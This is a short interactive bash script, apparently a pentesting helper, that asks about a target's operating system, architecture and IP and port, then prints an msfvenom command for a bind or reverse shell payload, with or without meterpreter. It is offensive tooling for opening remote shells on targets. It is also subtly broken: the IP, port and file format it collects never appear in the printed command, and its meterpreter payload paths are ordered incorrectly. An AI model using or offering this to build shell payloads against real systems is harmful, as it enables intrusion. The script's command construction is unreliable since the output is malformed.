#!/bin/bash

echo "What is the operating system of your target? Example: windows, linux, osx"
read OS


echo "Is it 64 bit or 32? Please type 32 or 64."
read architecture

case $architecture in
	32)
		arc="x86"
	;;

	64)
		arc="x64"
	;;
esac

echo "Would you like to generate a bind shell or reverse shell? Please enter bind or reverse."
read shell

case $shell in
  reverse)
   	echo "Please enter your IP address."
        read ip
        echo "Please enter the port you would like to listen on."
        read port
    ;;

 bind)
        echo "Please enter your target's IP address."
	read ip
	echo "Please enter the remote port."
	read port
    ;;
esac

echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
read meterpreter

echo "What would you like the file format to be? Example: exe, raw, pl, rb, c"
read format

payload=""
msfgen=""

use_meterpreter() {
case  $OS  in
        windows)
                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
		msfgen="$payload/${shell}_tcp"
        ;;

        linux)
                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
                msfgen="$payload/${shell}_tcp"
        ;;

        osx)
                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
                msfgen="$payload/${shell}_tcp"
        ;;

        *)

esac
}


no_meterpreter() {
case  $OS  in
        windows)
                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
                msfgen="$payload${shell}_tcp"
        ;;

        linux)
                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
                msfgen="$payload${shell}_tcp"
        ;;

        osx)
                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
                msfgen="$payload${shell}_tcp"
        ;;
        *)

esac
}

case  $meterpreter  in
	y)
	echo "You are using meterpreter."
	payload="$OS/meterpreter/$arc"
	use_meterpreter

        ;;
	n)
	echo "You are not using meterpreter."
	payload="$OS/$arc/shell_"
	no_meterpreter
        ;;
	*)
esac

echo "msfvenom -p ${msfgen}"
